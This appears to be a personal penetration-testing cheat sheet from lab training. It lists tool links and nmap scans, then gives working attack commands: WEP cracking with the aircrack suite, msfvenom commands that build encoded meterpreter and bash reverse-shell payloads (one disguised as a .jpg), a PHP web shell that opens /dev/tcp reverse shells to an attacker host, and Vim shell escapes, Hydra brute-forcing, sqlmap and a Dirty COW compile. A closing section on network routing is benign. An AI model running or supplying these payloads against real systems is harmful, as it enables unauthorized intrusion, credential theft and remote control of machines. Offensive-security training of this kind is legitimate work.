
Date: 30/7/2021
Name: Personal CheatSheet 
This is getting updated after a shared Google Doc got removed for no good reason, it had the list of tools I gathered over time.

Articles and useful links:
PErsonal notes on Burp, Bloodhound and :
https://docs.google.com/document/d/1p_hQ1jIuYsPt23EroJMmgkSYob6VdxVtO0a3sl3mLtw/edit?usp=sharing


W3Af: 
http://w3af.org/
http://docs.w3af.org/en/latest/install.html 

Bruteforcing tool Patator:
https://tools.kali.org/password-attacks/patator
https://github.com/lanjelot/patator (Docker based)

XSS and all: PwnXSS & XSSer

Command injection testing:
https://github.com/stasinopoulos/commix

List of kali tools:
https://tools.kali.org/tools-listing

GUI for Aircrack NG:
https://github.com/savio-code/fern-wifi-cracker

Locate Wifi info:
https://wigle.net/search

Nmap vs Netdiscover: NMAP is based on IP requests, Netdiscover is based on ARP, hence faster
Wireshark: protocol analyser
Snmpcheck/snmpwalk: Test snmp
Ettercap: Perform MITM
Crunch: create word list

Vulnerability assesment (for web apps):
Nessus, Nikto, Open Vas


Shortcut pratice description of Airmon Ng for WEP:
 Q) Get a practice WiFi AP 
So do a airmon-ng, then run a airodump-ng scan on all CHs with the filtering option to for only WEP.
then walk around your place with your laptop, looking for the strongest WEP AP. When you find it, lock on to it aka restarting airodump-ng to show only that AP & at the end do -w to write the data to a name-of-ap.pcap file.
Now at this part you are looking at the IV packets. you need so many of them before you can crack it.
I forget off hand how many because it has been a long time, but I think it's 1000, or something like that.
the more the better.
Now the IV packets come in slow,
this is where the aireplay-ng comes into play to gen up more IV data.
should not take longer then 2-3 min
when done just run aircrack-ng on the pcap file. 
the crack should not take longer then 7 to 12 min.



















******************************************************************IGNORE, self reference only**************************************************
Important python packages
*
1. Scapy for ARP spoofing and other packety interception/modification techniques, refer
https://scapy.net/
https://github.com/davidbombal/scapy/blob/main/spanning-tree-root-attack.py

2. Selenium, webbot for testing web apps
3. 

***************************************************


Refer enumeration scripts



***************************************************
Common nmap scans formats (lookup options for more reasons): AVOID using -sC unless needed (can cut down results):
nmap -Pn -sT -sV -sC -O  -p 0-65535 10.11.1.36 -oA nmaptcpfullscan1
nmap -Pn -sU -sV -O 10.11.1.36 -oA nmapudpscan
nmap --script=smb-vuln* -p 139,445 10.11.1.83 

Easy netcat tests: 
nc -vlnp 8000

Set up a listener to catch a reverse shell on meterpreter or whatever but set the payload accordingly:

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options


Post session:
show sessions
sessions -i 1


How to generate payload using msfvenom?
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.2.2 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=192.168.23.103 LPORT=443 -f exe > Cyberwarzone_reverse_tcp.exe

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=172.16.2.2 LPORT=8000

msfvenom -p cmd/unix/reverse_bash LHOST=172.16.2.2 LPORT=8000 R

msfvenom -p cmd/unix/reverse_bash LHOST=172.16.2.2 LPORT=8000 R > exploit.jpg

msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.2.2 LPORT=8000 -f raw > exploit1

Exec a python script to do something: (standard, easy stuff, just noted during VHL)
./joomraa.py -u hacker -p password -e hacker@example.com -x exploit1.pht http://10.12.1.177:80

Mysql login CLI
mysql://root:joomla@http://10.12.1.177:3306/joomla
mysql --host=10.12.1.177 --user=root --password=joomla joomla


Tools to convert image to text: tesseract
Tool to add or edit image metadata: exiftool
Tool to resize image through CLI: Magick

Link for msfconsole stuff....
https://netsec.ws/?p=331

Compile exploits in C:
sudo apt-get install gcc-multilib
To compile for different arch:
gcc -m32 source -o target

Start or stop services:
service apache2 restart

Host exploits for copy/paste on target:
use python simplehttpserver (easier, choose right directory such as tmp or uploads)
For ports to listen/send, use 443/80/standard ports.
Host simple webserver
python -m SimpleHTTPServer 80

Then wget/curl or certutil for windows (insert approp links)

PHP shell uploaded on target machine to listen to multiple ports and accept an exploit

<?php
shell_exec("/bin/bash -c '/dev/tcp/172.16.2.1/443 > exploit;exit'"); 
shell_exec("/bin/bash -c ' bash -i >& /dev/tcp/172.16.2.1/80 0>&1'"); ?>

Corresponding netcat listeners on attacking machine:
nc -nlvp 80
nc -nlvp 443 < a.out

Command to list every bit of info inside a folder:
ls -asl



OPENVAS

[*] Opening Web UI (https://127.0.0.1:9392) in: 5... 4... 3... 2... 1... 

[>] Checking for admin user
[*] Creating admin user
User created with password '78e4cdcd-5bc2-4057-bdc3-b79f74ab7164'.

Nikto shortcuts
nikto -host 10.12.1.109 -port 135,139,445,554,2869,8009,8080,10243,49152,49153,49154,49159,49160


hydra -l root  -P /usr/share/wordlists/rockyou.txt 10.12.1.11 mysql


$ ls -lah foo
-r-----r-- 1 root root
Give attention:

chown root:root ping && chmod 4755 ping


Get command line terminal from meterpreter shell
Get cmd:
execute -f cmd.exe -i -H
BEst ls versions, others being ls -s

gcc cowroot.c -o cowroot -pthread
Also check firefart

Reverse shells:
/bin/bash -c ' bash -i >& /dev/tcp/172.16.2.2/443 0>&1'


From Vim exec commands (if bad permissions are present) :

:! /bin/bash -c ' bash -i >& /dev/tcp/172.16.2.2/443 0>&1'


From meterpreter shell, type getuid for privilege level/user name,
type shell for linux shell, type " execute -f cmd.exe -i -H" for windows.

Python breakout shell:
python -c 'import pty; pty.spawn("/bin/sh")'



Hydra example
hydra -s 80 -L /usr/share/metasploit-framework/data/wordlists/http_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt 169.254.137.71 http-post-form '/login:username=^USER^&password=^PASS^:F=Incorrect' -e ns -t 1 -w 5 -W 1 -vV

Sqlmap examples
sqlmap -r login -p username,password --risk 3 --level 5 --dbms mysql

****************************************************

How to use NC and then GET commands:
nc -nv 10.168.105.56 80
GET / HTTP/1.0



Can do all get post stuff from here
-------------------------------------------------------------------------------------------

Set up a WiFi and Ethernet access without bothering each other (using dedicated different router)

How to set up different gateways for multiple networks lets say
over Ethernet and Wifi

First check that the default gateway isnt the same or prioritized

Then go for the following commands

ip a
route

Then lets say for the Ethernet we are trying to get the IP from the DHCP

sudo dhclient eth0

If that doesnt work, lets try this:

sudo ifconfig eth0 10.168.105.221/24


Then type and check the routing table
ip route
default via 10.168.105.17 dev eth0
default via 10.11.128.1 dev wlan0 proto dhcp metric 600
10.11.128.0/20 dev wlan0 proto kernel scope link src 10.11.143.0 metric 600
10.168.105.0/24 dev eth0 proto kernel scope link src 10.168.105.221
172.16.83.0/24 dev vmnet8 proto kernel scope link src 172.16.83.1
172.16.179.0/24 dev vmnet1 proto kernel scope link src 172.16.179.1

Fix the gateway issue by deleting like this:
sudo ip route del default via 10.168.105.17 dev eth0

──(ayan㉿kali)-[~]
└─$ ip route
default via 10.11.128.1 dev wlan0 proto dhcp metric 600
10.11.128.0/20 dev wlan0 proto kernel scope link src 10.11.143.0 metric 600
10.168.105.0/24 dev eth0 proto kernel scope link src 10.168.105.221
172.16.83.0/24 dev vmnet8 proto kernel scope link src 172.16.83.1
172.16.179.0/24 dev vmnet1 proto kernel scope link src 172.16.179.1

Then add the IP route to the gateways (pointing to a router) explicitly
┌──(ayan㉿kali)-[~]
└─$ sudo ip route add 10.168.106.0/24 via 10.168.105.17 dev eth0

┌──(ayan㉿kali)-[~]
└─$ sudo ip route add 10.168.107.0/24 via 10.168.105.17 dev eth0

┌──(ayan㉿kali)-[~]
└─$ sudo ip route add 10.168.108.0/24 via 10.168.105.17 dev eth0

┌──(ayan㉿kali)-[~]
└─$ ip route
default via 10.11.128.1 dev wlan0 proto dhcp metric 600
10.11.128.0/20 dev wlan0 proto kernel scope link src 10.11.143.0 metric 600
10.168.105.0/24 dev eth0 proto kernel scope link src 10.168.105.221
10.168.106.0/24 via 10.168.105.17 dev eth0
10.168.107.0/24 via 10.168.105.17 dev eth0
10.168.108.0/24 via 10.168.105.17 dev eth0
172.16.83.0/24 dev vmnet8 proto kernel scope link src 172.16.83.1
172.16.179.0/24 dev vmnet1 proto kernel scope link src 172.16.179.1


─$ sudo ip route add 10.168.105.0/24 via 10.168.106.52 dev eth0

┌──(ayan㉿kali)-[~]
└─$ sudo ip route add 10.103.14.0/24 via 10.168.106.100 dev eth0
-------------------------------------------------------------------------------------------






























